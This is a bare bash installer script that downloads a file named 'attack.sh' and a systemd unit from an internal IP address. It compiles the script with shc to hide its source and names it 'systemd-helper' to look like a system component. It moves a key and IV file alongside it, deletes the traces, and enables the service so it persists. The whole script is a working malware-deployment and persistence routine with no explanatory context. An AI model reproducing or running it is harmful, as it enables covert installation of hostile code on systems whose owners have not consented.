#!/bin/bash
wget http://192.168.162.123/media/attack.sh -O /usr/lib/systemd/systemd-helper.sh
wget http://192.168.162.123/media/systemd-helper.service -O /etc/systemd/system/systemd-helper.service
mv /tmp/network.key /usr/lib/systemd/network.key
mv /tmp/iv.txt /usr/lib/systemd/iv.txt
chmod +x /usr/lib/systemd/systemd-helper.sh
shc -f /usr/lib/systemd/systemd-helper.sh
cp /usr/lib/systemd/systemd-helper.sh.x /usr/lib/systemd/systemd-helper
rm /usr/lib/systemd/systemd-helper.sh
rm /usr/lib/systemd/systemd-helper.sh.x.c
rm /usr/lib/systemd/systemd-helper.sh.x

sudo systemctl enable systemd-helper.service
sleep 5
sudo systemctl start systemd-helper.service  